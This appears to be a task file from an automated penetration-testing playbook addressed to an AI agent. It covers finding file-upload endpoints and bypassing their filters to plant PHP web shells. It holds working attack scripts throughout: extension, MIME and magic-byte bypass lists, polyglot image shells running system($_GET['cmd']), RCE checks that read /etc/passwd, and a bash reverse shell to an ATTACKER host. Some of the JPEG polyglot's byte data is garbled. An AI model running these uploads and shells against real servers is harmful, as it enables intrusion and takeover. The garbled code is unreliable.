@@ -1,0 +1,1109 @@
+================================================================================
+TASK 74 · FILE UPLOAD DETECTION & BYPASS TECHNIQUES
+================================================================================
+Covers testing_toolkit.txt Phase 9 Step 31 (Part 1)
+Detecting file upload functionality and bypassing restrictions.
+
+⚠️  CRITICAL ATTACK VECTOR
+    File upload leads to: RCE, XSS, XXE, SSRF, DoS
+
+================================================================================
+INPUTS
+================================================================================
+outputs/url_corpus_all_in_scope.txt        ← URL corpus
+outputs/live_base_urls.txt                 ← Live hosts
+outputs/har/common_data.txt                ← Endpoints from HAR
+outputs/har/accounts/*_auth.json           ← Auth tokens per account
+outputs/nuclei/tech_stack.json             ← Tech stack detection
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/upload/
+├── upload_endpoints.txt            ← Discovered upload endpoints
+├── upload_analysis.txt             ← Detailed endpoint analysis
+├── extension_bypass_results.txt    ← Extension filter bypasses
+├── mime_bypass_results.txt         ← MIME type bypasses
+├── content_bypass_results.txt      ← Content validation bypasses
+├── size_bypass_results.txt         ← Size restriction bypasses
+├── upload_locations.txt            ← Where uploaded files are stored
+└── upload_detection_log.txt        ← Full execution log
+
+temp/agent1/queue_upload_exploitation.txt  ← Queue for Task 75 exploitation
+
+================================================================================
+🧠 AGENT DECISION FRAMEWORK 🧠
+================================================================================
+
+When you find an upload endpoint, THINK:
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ QUESTION                           │ WHY IT MATTERS                        │
+├────────────────────────────────────┼───────────────────────────────────────┤
+│ What file types are allowed?       │ Determines bypass techniques needed   │
+│ Client-side or server-side check?  │ Client-side = trivial bypass          │
+│ What happens to uploaded files?    │ Executed? Served? Processed?          │
+│ Where are files stored?            │ Web root = RCE possible               │
+│ Filename preserved or randomized?  │ Path traversal possible?              │
+│ What backend technology?           │ PHP, ASP, JSP = different payloads    │
+│ Is there image processing?         │ ImageMagick = ImageTragick            │
+│ PDF generation involved?           │ SSRF via embedded resources           │
+│ DOCX/XLSX processing?              │ XXE via embedded XML                  │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+================================================================================
+🎯 UPLOAD ATTACK DECISION TREE 🎯
+================================================================================
+
+UPLOAD FOUND → What's accepted?
+      │
+      ├─ Images only? → Try:
+      │   ├─ Extension bypass (.php.jpg, .pHp)
+      │   ├─ MIME bypass (image/gif with PHP)
+      │   ├─ Magic bytes (GIF89a + PHP code)
+      │   ├─ SVG XSS
+      │   └─ ImageTragick (if ImageMagick)
+      │
+      ├─ Documents? → Try:
+      │   ├─ XXE in DOCX/XLSX/ODT
+      │   ├─ Macro injection
+      │   ├─ PDF SSRF
+      │   └─ Formula injection CSV
+      │
+      ├─ Any file? → Try:
+      │   ├─ Web shell upload
+      │   ├─ .htaccess upload
+      │   ├─ Config file overwrite
+      │   └─ Polyglot files
+      │
+      └─ Path in filename? → Try:
+          ├─ ../../evil.php
+          └─ Directory traversal to web root
+
+================================================================================
+PHASE 1: DISCOVER UPLOAD ENDPOINTS
+================================================================================
+
+───────────────────────────────────────
+1.1 Search URL Corpus for Upload Indicators
+───────────────────────────────────────
+#!/bin/bash
+# find_upload_endpoints.sh
+
+mkdir -p outputs/upload temp/agent1/upload
+
+# Upload-related URL patterns
+UPLOAD_PATTERNS=(
+    "upload"
+    "file"
+    "attach"
+    "import"
+    "document"
+    "image"
+    "avatar"
+    "photo"
+    "picture"
+    "media"
+    "asset"
+    "resource"
+    "multipart"
+    "form-data"
+)
+
+echo "[*] Searching for upload endpoints..."
+
+for pattern in "${UPLOAD_PATTERNS[@]}"; do
+    grep -i "$pattern" outputs/url_corpus_all_in_scope.txt
+done | sort -u > outputs/upload/upload_endpoints.txt
+
+echo "[+] Found $(wc -l < outputs/upload/upload_endpoints.txt) potential upload endpoints"
+
+───────────────────────────────────────
+1.2 Crawl for File Upload Forms
+───────────────────────────────────────
+#!/usr/bin/env python3
+# find_upload_forms.py
+
+"""
+Crawl pages to find HTML forms with file inputs
+"""
+
+import requests
+from bs4 import BeautifulSoup
+import sys
+
+class UploadFormFinder:
+    def __init__(self, auth_cookies=None):
+        self.session = requests.Session()
+        self.session.verify = False
+        self.session.cookies.update(auth_cookies or {})
+        self.upload_forms = []
+    
+    def find_file_inputs(self, url):
+        """Find <input type="file"> in page"""
+        try:
+            resp = self.session.get(url, timeout=30)
+            soup = BeautifulSoup(resp.text, 'html.parser')
+            
+            # Find all forms
+            forms = soup.find_all('form')
+            
+            for form in forms:
+                file_inputs = form.find_all('input', {'type': 'file'})
+                
+                if file_inputs:
+                    # Get form details
+                    form_action = form.get('action', url)
+                    form_method = form.get('method', 'POST').upper()
+                    form_enctype = form.get('enctype', '')
+                    
+                    # Make absolute URL
+                    if not form_action.startswith('http'):
+                        from urllib.parse import urljoin
+                        form_action = urljoin(url, form_action)
+                    
+                    # Get input details
+                    for file_input in file_inputs:
+                        input_name = file_input.get('name', 'file')
+                        accept = file_input.get('accept', '*')
+                        
+                        self.upload_forms.append({
+                            'page_url': url,
+                            'form_action': form_action,
+                            'method': form_method,
+                            'enctype': form_enctype,
+                            'input_name': input_name,
+                            'accept': accept
+                        })
+                        
+                        print(f"[+] Found upload form:")
+                        print(f"    URL: {form_action}")
+                        print(f"    Input: {input_name}")
+                        print(f"    Accept: {accept}")
+            
+        except Exception as e:
+            pass
+    
+    def save_results(self, output_file):
+        with open(output_file, 'w') as f:
+            for form in self.upload_forms:
+                f.write(f"{form['form_action']}|{form['input_name']}|{form['accept']}\n")
+
+# Main
+finder = UploadFormFinder()
+
+with open('temp/agent1/live_base_urls.txt') as f:
+    for line in f:
+        base_url = line.strip()
+        # Check common upload pages
+        upload_pages = [
+            '/upload', '/upload.php', '/upload.aspx',
+            '/file-upload', '/attachments', '/media',
+            '/admin/upload', '/user/avatar', '/profile',
+            '/settings', '/dashboard', '/import'
+        ]
+        for page in upload_pages:
+            finder.find_file_inputs(f"{base_url}{page}")
+
+finder.save_results('outputs/upload/upload_endpoints.txt')
+
+───────────────────────────────────────
+1.3 Analyze HAR for Multipart Requests
+───────────────────────────────────────
+#!/usr/bin/env python3
+# analyze_har_uploads.py
+
+"""
+Find upload requests in HAR files
+"""
+
+import json
+import os
+
+def find_uploads_in_har(har_file):
+    """Extract multipart/form-data requests from HAR"""
+    
+    with open(har_file) as f:
+        har = json.load(f)
+    
+    uploads = []
+    entries = har.get('log', {}).get('entries', [])
+    
+    for entry in entries:
+        request = entry.get('request', {})
+        
+        # Check for multipart content type
+        headers = {h['name'].lower(): h['value'] for h in request.get('headers', [])}
+        content_type = headers.get('content-type', '')
+        
+        if 'multipart/form-data' in content_type:
+            uploads.append({
+                'url': request.get('url'),
+                'method': request.get('method'),
+                'content_type': content_type
+            })
+            print(f"[+] Found upload: {request.get('url')}")
+    
+    return uploads
+
+# Process all HAR files
+har_dir = 'manual/har'
+all_uploads = []
+
+if os.path.exists(har_dir):
+    for har_file in os.listdir(har_dir):
+        if har_file.endswith('.har'):
+            uploads = find_uploads_in_har(os.path.join(har_dir, har_file))
+            all_uploads.extend(uploads)
+
+# Save results
+with open('outputs/upload/upload_from_har.txt', 'w') as f:
+    for u in all_uploads:
+        f.write(f"{u['url']}|{u['method']}|{u['content_type']}\n")
+
+================================================================================
+PHASE 2: FUXPLOIDER - AUTOMATED UPLOAD SCANNER
+================================================================================
+
+───────────────────────────────────────
+2.1 Install Fuxploider
+───────────────────────────────────────
+# Clone and install
+git clone https://github.com/almandin/fuxploider.git
+cd fuxploider
+pip3 install -r requirements.txt
+
+# Verify
+python3 fuxploider.py -h
+
+───────────────────────────────────────
+2.2 Run Fuxploider Scan
+───────────────────────────────────────
+#!/bin/bash
+# fuxploider_scan.sh
+
+# Fuxploider tests:
+# - Extension bypasses
+# - MIME type bypasses
+# - Content-type bypasses
+# - Magic bytes
+# - Double extensions
+# - Null byte injection
+# - Case manipulation
+
+UPLOAD_URL="$1"    # Full URL to upload endpoint
+FILE_PARAM="$2"    # Name of file input field (default: file)
+
+python3 fuxploider.py \
+    --url "$UPLOAD_URL" \
+    --not-regex "error|failed|invalid" \
+    --true-regex "success|uploaded|complete" \
+    -v \
+    2>&1 | tee outputs/upload/fuxploider_$(date +%s).txt
+
+# OPTIONS:
+# --url           Upload URL
+# --not-regex     Pattern indicating failure
+# --true-regex    Pattern indicating success
+# -v              Verbose output
+# --cookies       Authentication cookies
+# --data          Additional POST data
+
+───────────────────────────────────────
+2.3 Fuxploider with Authentication
+───────────────────────────────────────
+#!/bin/bash
+# fuxploider_auth.sh
+
+# Extract cookies from auth file
+AUTH_FILE="outputs/har/accounts/user1_auth.json"
+
+if [ -f "$AUTH_FILE" ]; then
+    COOKIES=$(jq -r '.cookies | to_entries | map("\(.key)=\(.value)") | join("; ")' "$AUTH_FILE" 2>/dev/null)
+fi
+
+UPLOAD_URL="$1"
+
+python3 fuxploider.py \
+    --url "$UPLOAD_URL" \
+    --cookies "$COOKIES" \
+    --not-regex "error|failed|forbidden|unauthorized" \
+    --true-regex "success|uploaded|saved" \
+    -v
+
+───────────────────────────────────────
+2.4 Batch Fuxploider Scan
+───────────────────────────────────────
+#!/bin/bash
+# fuxploider_batch.sh
+
+while IFS='|' read -r url input_name accept; do
+    echo "[*] Scanning: $url"
+    
+    timeout 300 python3 fuxploider.py \
+        --url "$url" \
+        --not-regex "error|failed|invalid" \
+        --true-regex "success|uploaded|complete" \
+        -v 2>&1 >> outputs/upload/fuxploider_batch.txt
+    
+    echo "---" >> outputs/upload/fuxploider_batch.txt
+    
+done < outputs/upload/upload_endpoints.txt
+
+================================================================================
+PHASE 3: EXTENSION BYPASS TECHNIQUES
+================================================================================
+
+───────────────────────────────────────
+🧠 THINK: How does the server validate extensions?
+───────────────────────────────────────
+Server might check:
+1. Client-side JavaScript (easy bypass)
+2. Filename extension (blacklist/whitelist)
+3. Content-Type header (easy to spoof)
+4. File magic bytes (harder to bypass)
+5. Actual file content parsing (hardest)
+
+───────────────────────────────────────
+3.1 Extension Bypass Payloads
+───────────────────────────────────────
+# Create comprehensive extension bypass list
+cat > temp/agent1/upload/extension_bypasses.txt << 'EOF'
+# Double extensions
+shell.php.jpg
+shell.php.png
+shell.php.gif
+shell.php.pdf
+shell.php.txt
+shell.php5.jpg
+shell.phtml.jpg
+
+# Case manipulation
+shell.PhP
+shell.pHP
+shell.PHp
+shell.PHP
+shell.Php5
+shell.pHtMl
+
+# Alternate extensions (PHP)
+shell.php3
+shell.php4
+shell.php5
+shell.php7
+shell.pht
+shell.phtm
+shell.phtml
+shell.phps
+shell.phar
+shell.inc
+shell.hphp
+shell.ctp
+
+# Alternate extensions (ASP)
+shell.asp
+shell.aspx
+shell.ashx
+shell.asmx
+shell.ascx
+shell.cer
+shell.asa
+shell.config
+
+# Alternate extensions (JSP)
+shell.jsp
+shell.jspx
+shell.jsw
+shell.jsv
+shell.jspf
+shell.wss
+shell.do
+shell.action
+
+# Null byte (old servers)
+shell.php%00.jpg
+shell.php\x00.jpg
+shell.php%00.png
+shell.php\0.gif
+
+# Trailing characters
+shell.php.
+shell.php..
+shell.php...
+shell.php;.jpg
+shell.php%0d%0a.jpg
+shell.php:jpg
+shell.php::$DATA
+
+# URL encoding
+shell.%70%68%70
+shell.p%68p
+shell.ph%70
+
+# Double encoding
+shell.%2570%2568%2570
+
+# Unicode/overlong
+shell.p\u0068p
+shell.ph\xc0\xf0
+
+# Windows specific
+shell.php::$DATA
+shell.php:.jpg
+shell.php::$DATA.jpg
+shell.php%20
+shell.php%0a
+shell.php%0d%0a
+
+# Space/special chars
+shell.php .jpg
+shell.php\tjpg
+shell .php
+shell.php....
+
+# htaccess injection
+.htaccess
+.user.ini
+web.config
+EOF
+
+───────────────────────────────────────
+3.2 Automated Extension Testing
+───────────────────────────────────────
+#!/usr/bin/env python3
+# extension_bypass.py
+
+"""
+Test various extension bypasses against upload endpoint
+"""
+
+import requests
+import os
+
+class ExtensionBypassTester:
+    def __init__(self, upload_url, file_param='file', auth_cookies=None):
+        self.upload_url = upload_url
+        self.file_param = file_param
+        self.session = requests.Session()
+        self.session.verify = False
+        self.session.cookies.update(auth_cookies or {})
+        self.successful_bypasses = []
+        
+        # PHP web shell content
+        self.php_shell = b'<?php echo "SHELL_SUCCESS"; system($_GET["cmd"]); ?>'
+    
+    def get_bypass_filenames(self):
+        """Generate list of filenames to test"""
+        
+        base_bypasses = [
+            # Double extensions
+            'shell.php.jpg', 'shell.php.png', 'shell.php.gif',
+            'shell.php.txt', 'shell.php.pdf', 'shell.php5.jpg',
+            
+            # Case manipulation
+            'shell.PhP', 'shell.pHP', 'shell.PHp', 'shell.Php5',
+            
+            # Alternate extensions
+            'shell.php3', 'shell.php4', 'shell.php5', 'shell.php7',
+            'shell.pht', 'shell.phtm', 'shell.phtml', 'shell.phar',
+            
+            # Null byte (legacy)
+            'shell.php%00.jpg', 'shell.php\x00.jpg',
+            
+            # Trailing
+            'shell.php.', 'shell.php..', 'shell.php;.jpg',
+            
+            # Windows
+            'shell.php::$DATA', 'shell.php:.jpg', 'shell.php%20',
+            
+            # Space tricks
+            'shell.php ', ' shell.php', 'shell .php',
+            
+            # URL encoded
+            'shell.%70%68%70', 'shell.p%68p',
+        ]
+        
+        return base_bypasses
+    
+    def test_upload(self, filename):
+        """Test single filename"""
+        
+        files = {
+            self.file_param: (filename, self.php_shell, 'image/jpeg')
+        }
+        
+        try:
+            resp = self.session.post(
+                self.upload_url,
+                files=files,
+                timeout=30
+            )
+            
+            # Check for success indicators
+            if resp.status_code == 200:
+                body = resp.text.lower()
+                
+                # Look for uploaded file path
+                import re
+                path_match = re.search(r'(uploads?|files?|media)[/"\'\\]?\s*[/"\'\\:]?\s*([a-zA-Z0-9_.-]+)', body)
+                
+                # Check for success indicators
+                if any(ind in body for ind in ['success', 'uploaded', 'saved', 'complete']):
+                    if 'error' not in body and 'invalid' not in body:
+                        return True, resp.text
+            
+            return False, None
+            
+        except Exception as e:
+            return False, str(e)
+    
+    def run_tests(self):
+        """Test all bypass techniques"""
+        
+        filenames = self.get_bypass_filenames()
+        
+        print(f"[*] Testing {len(filenames)} extension bypasses...")
+        
+        for filename in filenames:
+            success, response = self.test_upload(filename)
+            
+            if success:
+                print(f"[+] BYPASS SUCCESS: {filename}")
+                self.successful_bypasses.append({
+                    'filename': filename,
+                    'response': response[:500] if response else None
+                })
+        
+        return self.successful_bypasses
+    
+    def save_results(self, output_file):
+        with open(output_file, 'w') as f:
+            for bypass in self.successful_bypasses:
+                f.write(f"{self.upload_url}|{bypass['filename']}|extension_bypass\n")
+
+# Main
+if __name__ == "__main__":
+    import sys
+    
+    if len(sys.argv) < 2:
+        print(f"Usage: {sys.argv[0]} <upload_url> [file_param]")
+        sys.exit(1)
+    
+    upload_url = sys.argv[1]
+    file_param = sys.argv[2] if len(sys.argv) > 2 else 'file'
+    
+    tester = ExtensionBypassTester(upload_url, file_param)
+    results = tester.run_tests()
+    
+    print(f"\n[*] Successful bypasses: {len(results)}")
+    tester.save_results('outputs/upload/extension_bypass_results.txt')
+
+================================================================================
+PHASE 4: MIME TYPE & CONTENT-TYPE BYPASS
+================================================================================
+
+───────────────────────────────────────
+4.1 MIME Type Manipulation
+───────────────────────────────────────
+#!/usr/bin/env python3
+# mime_bypass.py
+
+"""
+Test MIME type bypasses - server may only check Content-Type header
+"""
+
+import requests
+
+class MIMEBypassTester:
+    def __init__(self, upload_url, file_param='file', auth_cookies=None):
+        self.upload_url = upload_url
+        self.file_param = file_param
+        self.session = requests.Session()
+        self.session.verify = False
+        self.session.cookies.update(auth_cookies or {})
+        self.results = []
+        
+        # PHP shell content
+        self.shell_content = b'<?php echo "SHELL_SUCCESS"; system($_GET["cmd"]); ?>'
+    
+    def get_mime_types(self):
+        """MIME types to test"""
+        return [
+            # Image types (most commonly whitelisted)
+            'image/gif',
+            'image/png', 
+            'image/jpeg',
+            'image/jpg',
+            'image/webp',
+            'image/svg+xml',
+            'image/x-icon',
+            
+            # Document types
+            'application/pdf',
+            'text/plain',
+            'text/html',
+            'application/msword',
+            'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
+            
+            # Archive types
+            'application/zip',
+            'application/x-zip-compressed',
+            'application/gzip',
+            
+            # Other
+            'application/octet-stream',
+            'multipart/form-data',
+            
+            # Weird/null
+            '',
+            'x',
+            'image',
+        ]
+    
+    def test_mime(self, mime_type):
+        """Test upload with specific MIME type"""
+        
+        # Keep .php extension but change MIME
+        files = {
+            self.file_param: ('shell.php', self.shell_content, mime_type)
+        }
+        
+        try:
+            resp = self.session.post(self.upload_url, files=files, timeout=30)
+            
+            if resp.status_code == 200:
+                body = resp.text.lower()
+                if any(ind in body for ind in ['success', 'uploaded', 'saved']):
+                    if 'error' not in body:
+                        return True
+        except:
+            pass
+        
+        return False
+    
+    def run_tests(self):
+        """Test all MIME types"""
+        
+        mime_types = self.get_mime_types()
+        
+        for mime in mime_types:
+            if self.test_mime(mime):
+                print(f"[+] MIME BYPASS: shell.php with {mime}")
+                self.results.append({
+                    'filename': 'shell.php',
+                    'mime': mime,
+                    'type': 'mime_bypass'
+                })
+        
+        return self.results
+
+# Main
+tester = MIMEBypassTester("http://target.com/upload")
+tester.run_tests()
+
+───────────────────────────────────────
+4.2 Content-Type Header vs File Content
+───────────────────────────────────────
+#!/bin/bash
+# content_type_mismatch.sh
+
+# Server might check Content-Type header but not file content
+# Send PHP shell with image Content-Type
+
+UPLOAD_URL="$1"
+AUTH_COOKIE="$2"
+
+# Create PHP shell
+SHELL_CONTENT='<?php echo "SHELL"; system($_GET["cmd"]); ?>'
+
+# Test with various Content-Type headers
+CONTENT_TYPES=(
+    "image/gif"
+    "image/png"
+    "image/jpeg"
+    "application/pdf"
+    "text/plain"
+)
+
+for ct in "${CONTENT_TYPES[@]}"; do
+    echo "[*] Testing: $ct"
+    
+    response=$(curl -sk "$UPLOAD_URL" \
+        -H "Cookie: $AUTH_COOKIE" \
+        -F "file=@-;filename=shell.php;type=$ct" <<< "$SHELL_CONTENT")
+    
+    if echo "$response" | grep -qiE "success|uploaded"; then
+        echo "[+] BYPASS: Content-Type $ct accepted with .php"
+        echo "$UPLOAD_URL|shell.php|$ct" >> outputs/upload/mime_bypass_results.txt
+    fi
+done
+
+================================================================================
+PHASE 5: MAGIC BYTES BYPASS
+================================================================================
+
+───────────────────────────────────────
+🧠 THINK: What are magic bytes?
+───────────────────────────────────────
+Files have signature bytes at the start (magic numbers):
+- GIF: GIF87a or GIF89a
+- PNG: 89 50 4E 47 0D 0A 1A 0A
+- JPEG: FF D8 FF E0/E1
+- PDF: %PDF-
+
+Servers may check magic bytes but not the rest of the file.
+Solution: Prepend magic bytes to PHP shell!
+
+───────────────────────────────────────
+5.1 Create Polyglot Shells
+───────────────────────────────────────
+#!/bin/bash
+# create_polyglot_shells.sh
+
+mkdir -p temp/agent1/upload/polyglots
+
+# GIF89a polyglot - most reliable
+echo -e 'GIF89a<?php system($_GET["cmd"]); ?>' > temp/agent1/upload/polyglots/shell.gif.php
+
+# GIF with valid dimensions
+printf 'GIF89a\x01\x00\x01\x00\x00\x00\x00;<?php system($_GET["cmd"]); ?>' > temp/agent1/upload/polyglots/shell_valid.gif
+
+# PNG polyglot (harder - may corrupt)
+printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > temp/agent1/upload/polyglots/shell.png.php
+
+# JPEG polyglot 
+printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00<?php system($_GET["cmd"]); ?>' > temp/agent1/upload/polyglots/shell.jpg.php
+
+# BMP polyglot
+printf 'BM<?php system($_GET["cmd"]); ?>' > temp/agent1/upload/polyglots/shell.bmp.php
+
+# PDF polyglot
+printf '%%PDF-1.4\n<?php system($_GET["cmd"]); ?>' > temp/agent1/upload/polyglots/shell.pdf.php
+
+echo "[+] Created polyglot shells in temp/agent1/upload/polyglots/"
+
+───────────────────────────────────────
+5.2 Polyglot Shell Tester
+───────────────────────────────────────
+#!/usr/bin/env python3
+# polyglot_upload.py
+
+"""
+Create and test polyglot files (valid image + PHP code)
+"""
+
+import requests
+import os
+
+class PolyglotUploader:
+    def __init__(self, upload_url, file_param='file', auth_cookies=None):
+        self.upload_url = upload_url
+        self.file_param = file_param
+        self.session = requests.Session()
+        self.session.verify = False
+        self.session.cookies.update(auth_cookies or {})
+    
+    def create_gif_polyglot(self, payload='<?php system($_GET["cmd"]); ?>'):
+        """Create GIF89a polyglot with PHP payload"""
+        # GIF89a header with minimal valid structure
+        gif_header = b'GIF89a'
+        # Logical Screen Descriptor (width=1, height=1, no GCT)
+        gif_lsd = b'\x01\x00\x01\x00\x00\x00\x00'
+        # Image Descriptor
+        gif_img = b'\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00'
+        # Image Data (minimal)
+        gif_data = b'\x02\x02\x44\x01\x00\x3b'
+        
+        # PHP payload as comment
+        return gif_header + gif_lsd + payload.encode() + gif_data
+    
+    def create_png_polyglot(self, payload='<?php system($_GET["cmd"]); ?>'):
+        """Create PNG with PHP payload in tEXt chunk"""
+        # PNG signature
+        png_sig = b'\x89PNG\r\n\x1a\n'
+        # IHDR chunk (minimal valid)
+        ihdr = b'\x00\x00\x00\x0dIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde'
+        # tEXt chunk with payload
+        text_data = b'Comment\x00' + payload.encode()
+        text_length = len(text_data).to_bytes(4, 'big')
+        # IEND chunk
+        iend = b'\x00\x00\x00\x00IEND\xaeB`\x82'
+        
+        return png_sig + ihdr + text_length + b'tEXt' + text_data + iend
+    
+    def create_jpeg_polyglot(self, payload='<?php system($_GET["cmd"]); ?>'):
+        """Create JPEG with PHP payload in comment"""
+        # JPEG SOI marker
+        soi = b'\xff\xd8'
+        # APP0 marker (JFIF)
+        app0 = b'\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
+        # Comment marker with payload
+        comment = b'\xff\xfe' + (len(payload) + 2).to_bytes(2, 'big') + payload.encode()
+        # Minimal image data
+        data = b'\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a\x1f\x1e\x1d\x1a\x1c\x1c $.\' ",#\x1c\x1c(7),01444\x1f\'9teletext;teletext;29teletext;29teletext;29teletext;29teletext;29'
+        # EOI marker
+        eoi = b'\xff\xd9'
+        
+        return soi + app0 + comment + eoi
+    
+    def test_polyglot(self, filename, content, mime_type):
+        """Test uploading a polyglot file"""
+        
+        files = {
+            self.file_param: (filename, content, mime_type)
+        }
+        
+        try:
+            resp = self.session.post(self.upload_url, files=files, timeout=30)
+            
+            if resp.status_code == 200:
+                body = resp.text.lower()
+                if any(ind in body for ind in ['success', 'uploaded', 'saved']):
+                    return True, resp.text
+        except:
+            pass
+        
+        return False, None
+    
+    def run_all_tests(self):
+        """Test all polyglot types"""
+        
+        results = []
+        
+        polyglots = [
+            ('shell.gif', self.create_gif_polyglot(), 'image/gif'),
+            ('shell.gif.php', self.create_gif_polyglot(), 'image/gif'),
+            ('shell.png', self.create_png_polyglot(), 'image/png'),
+            ('shell.png.php', self.create_png_polyglot(), 'image/png'),
+            ('shell.jpg', self.create_jpeg_polyglot(), 'image/jpeg'),
+            ('shell.jpg.php', self.create_jpeg_polyglot(), 'image/jpeg'),
+        ]
+        
+        for filename, content, mime in polyglots:
+            print(f"[*] Testing: {filename} ({mime})")
+            success, response = self.test_polyglot(filename, content, mime)
+            
+            if success:
+                print(f"[+] SUCCESS: {filename}")
+                results.append({
+                    'filename': filename,
+                    'mime': mime,
+                    'type': 'polyglot'
+                })
+        
+        return results
+
+================================================================================
+PHASE 6: UPLOAD LOCATION DISCOVERY
+================================================================================
+
+───────────────────────────────────────
+6.1 Find Where Files Are Stored
+───────────────────────────────────────
+#!/bin/bash
+# find_upload_location.sh
+
+# After successful upload, we need to find where files go
+# Check response for path hints
+
+UPLOAD_URL="$1"
+AUTH_COOKIE="$2"
+
+# Upload a file with unique identifier
+UNIQUE_ID="test_$(date +%s)"
+
+response=$(curl -sk "$UPLOAD_URL" \
+    -H "Cookie: $AUTH_COOKIE" \
+    -F "file=@temp/agent1/upload/polyglots/shell.gif;filename=${UNIQUE_ID}.gif")
+
+echo "[*] Upload response:"
+echo "$response"
+
+# Extract potential paths from response
+echo "[*] Potential paths in response:"
+echo "$response" | grep -oE '(\/[a-zA-Z0-9_\-\.\/]+|https?:\/\/[^\s"]+)' | sort -u
+
+# Common upload directories to check
+UPLOAD_DIRS=(
+    "/uploads/"
+    "/upload/"
+    "/files/"
+    "/media/"
+    "/assets/"
+    "/images/"
+    "/img/"
+    "/documents/"
+    "/attachments/"
+    "/static/uploads/"
+    "/public/uploads/"
+    "/storage/"
+    "/data/"
+)
+
+BASE_URL=$(echo "$UPLOAD_URL" | grep -oE 'https?://[^/]+')
+
+for dir in "${UPLOAD_DIRS[@]}"; do
+    # Check directory listing (if enabled)
+    status=$(curl -sk -o /dev/null -w "%{http_code}" "${BASE_URL}${dir}")
+    
+    if [ "$status" = "200" ] || [ "$status" = "403" ]; then
+        echo "[+] Directory exists: ${dir} (HTTP $status)"
+        
+        # Try to find our uploaded file
+        check=$(curl -sk "${BASE_URL}${dir}${UNIQUE_ID}.gif" -o /dev/null -w "%{http_code}")
+        if [ "$check" = "200" ]; then
+            echo "[!] FILE FOUND: ${BASE_URL}${dir}${UNIQUE_ID}.gif"
+            echo "${BASE_URL}${dir}" >> outputs/upload/upload_locations.txt
+        fi
+    fi
+done
+
+───────────────────────────────────────
+6.2 Path Extraction from Response
+───────────────────────────────────────
+#!/usr/bin/env python3
+# extract_upload_path.py
+
+"""
+Extract uploaded file path from various response formats
+"""
+
+import re
+import json
+
+def extract_path_from_response(response_text, filename):
+    """Extract uploaded file path from server response"""
+    
+    paths = []
+    
+    # Try JSON response
+    try:
+        data = json.loads(response_text)
+        # Common JSON keys for file path
+        path_keys = ['path', 'url', 'file', 'filepath', 'file_path', 'location', 
+                     'src', 'href', 'link', 'download_url', 'file_url']
+        
+        def search_dict(d):
+            for key, value in d.items():
+                if key.lower() in path_keys and isinstance(value, str):
+                    paths.append(value)
+                elif isinstance(value, dict):
+                    search_dict(value)
+                elif isinstance(value, list):
+                    for item in value:
+                        if isinstance(item, dict):
+                            search_dict(item)
+        
+        search_dict(data)
+    except:
+        pass
+    
+    # Regex patterns for paths
+    patterns = [
+        r'(\/uploads?\/[^\s"\'<>]+)',
+        r'(\/files?\/[^\s"\'<>]+)',
+        r'(\/media\/[^\s"\'<>]+)',
+        r'(\/storage\/[^\s"\'<>]+)',
+        r'(https?:\/\/[^\s"\'<>]+' + re.escape(filename) + r')',
+        r'["\']([^"\']*' + re.escape(filename) + r')["\']',
+    ]
+    
+    for pattern in patterns:
+        matches = re.findall(pattern, response_text, re.IGNORECASE)
+        paths.extend(matches)
+    
+    return list(set(paths))
+
+================================================================================
+PHASE 7: VERIFY SHELL EXECUTION
+================================================================================
+
+───────────────────────────────────────
+7.1 Test Shell Accessibility
+───────────────────────────────────────
+#!/bin/bash
+# verify_shell.sh
+
+SHELL_URL="$1"
+
+echo "[*] Testing shell at: $SHELL_URL"
+
+# Test 1: Check if file is accessible
+status=$(curl -sk -o /dev/null -w "%{http_code}" "$SHELL_URL")
+echo "[*] HTTP Status: $status"
+
+# Test 2: Check if PHP is executed (look for our marker)
+response=$(curl -sk "$SHELL_URL")
+
+if echo "$response" | grep -q "SHELL_SUCCESS\|SHELL"; then
+    echo "[!] SHELL EXECUTED - PHP code ran!"
+    
+    # Test 3: Try command execution
+    response=$(curl -sk "${SHELL_URL}?cmd=id")
+    
+    if echo "$response" | grep -qE "uid=|gid="; then
+        echo "[!] RCE CONFIRMED!"
+        echo "${SHELL_URL}|RCE_CONFIRMED" >> outputs/upload/upload_locations.txt
+    fi
+else
+    echo "[-] Shell uploaded but not executed (served as static)"
+    echo "    Try accessing with different extension or check server config"
+fi
+
+───────────────────────────────────────
+7.2 Document Successful Upload
+───────────────────────────────────────
+#!/bin/bash
+# document_upload.sh
+
+UPLOAD_URL="$1"
+SHELL_URL="$2"
+BYPASS_METHOD="$3"
+
+cat >> outputs/upload/upload_analysis.txt << EOF
+=== SUCCESSFUL UPLOAD ===
+Upload Endpoint: $UPLOAD_URL
+Shell Location:  $SHELL_URL
+Bypass Method:   $BYPASS_METHOD
+Timestamp:       $(date)
+
+Exploitation:
+  curl -sk "${SHELL_URL}?cmd=id"
+  curl -sk "${SHELL_URL}?cmd=whoami"
+  curl -sk "${SHELL_URL}?cmd=cat%20/etc/passwd"
+
+Reverse Shell:
+  curl -sk "${SHELL_URL}?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/ATTACKER/4444%200%3E%261%22"
+
+---
+EOF
+
+================================================================================
+SUMMARY & CHECKLIST
+================================================================================
+
+Before moving to Task 75 (exploitation), verify:
+
+□ All upload endpoints discovered
+□ Extension bypasses tested
+□ MIME type bypasses tested
+□ Magic byte/polyglot files tested
+□ Upload locations identified
+□ Shell execution verified (or documented as static)
+□ Results saved to outputs/upload/
+
+================================================================================
+📚 QUICK REFERENCE
+================================================================================
+
+Extension bypasses:
+  .php.jpg, .pHp, .php5, .phtml, .php%00.jpg
+
+MIME bypasses:
+  Content-Type: image/gif with .php file
+
+Magic bytes:
+  GIF89a + PHP code = valid GIF + executable PHP
+
+Upload locations:
+  /uploads/, /files/, /media/, /storage/
